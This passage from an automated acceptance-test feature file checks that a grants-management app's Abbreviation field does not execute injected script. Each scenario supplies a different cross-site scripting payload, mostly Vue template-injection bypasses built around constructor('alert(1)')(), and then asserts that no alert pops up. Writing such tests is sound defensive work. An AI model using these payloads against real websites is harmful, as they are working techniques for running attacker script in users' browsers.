      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301409 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                    | Field                |
      | {{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301420 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                        | Field                |
      | <img src @error=e=$event.path.pop().alert(1) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301428 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                   | Field                |
      | <img src @error=e=$event.composedPath().pop().alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301431 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                          | Field                |
      | <img src @error=this.alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301437 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                    | Field                |
      | <svg@load=this.alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301438 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301468 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | {{_openBlock.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301482 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | {{_createBlock.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301485 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                          | Field                |
      | {{_toDisplayString.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301487 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | {{_createVNode.constructor('alert(1)')()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301488 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                           | Field                |
      | <p v-show=_createBlock.constructor`alert(1)`()> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301490 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | <x @[_openBlock.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301491 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <x @[_capitalize.constructor`alert(1)`()]> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301493 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <x @click=_withCtx.constructor`alert(1)`()>click</x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301496 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | <x @click=$event.view.alert(1)>click</x> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301502 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | {{_Vue.h.constructor`alert(1)`()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301504 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | {{$emit.constructor`alert(1)`()}} | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
